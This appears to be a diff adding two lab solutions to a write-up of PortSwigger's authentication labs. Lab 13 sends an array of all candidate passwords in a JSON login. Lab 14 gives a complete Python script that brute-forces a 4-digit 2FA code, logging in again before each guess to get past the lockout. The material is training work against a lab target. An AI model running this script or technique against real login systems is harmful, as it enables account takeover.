@@ -575,3 +575,89 @@ for p in passwords:
 		sys.exit(0)
 ```
 
+## Lab 13: Multiple Creds per Request
+
+To solve this lab, access the account of `carlos`. This lab uses JSON to send its login credentials:
+
+![](../../.gitbook/assets/portswigger-auth-writeup-image-31.png)
+
+For this, the lab tells us 'multiple credentials'. Similar to PHP, one can attempt to send an array in as the password instead of having a single string.
+
+Sending an array does not trigger any funny errors:
+
+![](../../.gitbook/assets/portswigger-auth-writeup-image-32.png)
+
+Sending multiple passwords raises no errors, and so I created an array with ALL the possible passwords.
+
+This returned a 302:
+
+![](../../.gitbook/assets/portswigger-auth-writeup-image-33.png)
+
+Repeating the request in the browser solves the lab!
+
+## Lab 14: 2FA Brute Force Bypass
+
+This lab gives me `carlos` credentials, but has a faulty 2FA mechanism. Attempting to login requires a 2FA code:
+
+![](../../.gitbook/assets/portswigger-auth-writeup-image-34.png)
+
+The 3 main requests sent are:
+
+![](../../.gitbook/assets/portswigger-auth-writeup-image-35.png)
+
+When entering false codes, I have 2 tries before it sends me back to the `/login` page.
+
+![](../../.gitbook/assets/portswigger-auth-writeup-image-36.png)
+
+One attack path is logging in at `/login`, then sending a GET request to `/login2`. Afterwards, I can try brute-forcing the POST request to `/login2`. If I get kicked out, I can just reset the 'setup' process:
+
+```python
+import requests
+import re
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+HOST = '0a8a00080397486580b235a600340007'
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+url = f'https://{HOST}.web-security-academy.net'
+s = requests.Session()
+
+def setup():
+	## LOGIN
+	r = s.get(url + '/login', proxies=proxies, verify=False)
+	match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
+	login_csrf_token = match[1]
+
+	carlos_data ={
+		'csrf':login_csrf_token,
+		'username':'carlos',
+		'password':'montoya'
+	}
+	r = s.post(url + '/login', data=carlos_data, proxies=proxies, verify=False)
+
+	## GET LOGIN2
+	r = s.get(url + '/login2', proxies=proxies, verify=False)
+	match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
+	mfa_csrf_token = match[1]
+	if "Please enter your 4-digit security code" not in r.text:
+		print('[-] Get to login2 failed')
+		exit()
+	return mfa_csrf_token
+
+## BRUTE FORCE LOGIN2
+for i in range(10000):
+	mfa = '{0:04}'.format(i)
+	mfa_csrf_token = setup()
+	mfa_data = {
+		'csrf':mfa_csrf_token,
+		'mfa-code':mfa
+	}
+	r = s.post(url + '/login2', proxies=proxies, verify=False, data=mfa_data)
+	if "Invalid CSRF Token" in r.text:
+		mfa_csrf_token = setup()
+	if "Incorrect security code" not in r.text:
+		print(f'[+] Correct code: {i}')
+		exit()
+```
+
+This lab eventually solves the lab!
